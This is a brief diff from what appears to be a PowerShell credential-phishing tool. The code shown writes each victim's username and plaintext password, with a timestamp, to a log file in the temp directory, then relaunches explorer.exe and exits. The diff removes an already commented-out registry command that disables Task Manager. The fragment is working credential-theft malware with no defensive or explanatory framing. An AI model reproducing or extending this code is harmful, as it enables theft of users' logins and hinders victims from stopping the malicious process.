@@ -57,7 +57,6 @@ while ($counter -lt '1000000000')
       echo "   TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
       echo "   username  : $user" >> $env:tmp\CredsPhish.log
       echo "   password  : $pass" >> $env:tmp\CredsPhish.log
-      # cmd /c REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1 /f
       Start-Process -FilePath $env:windir\explorer.exe
       exit
     }
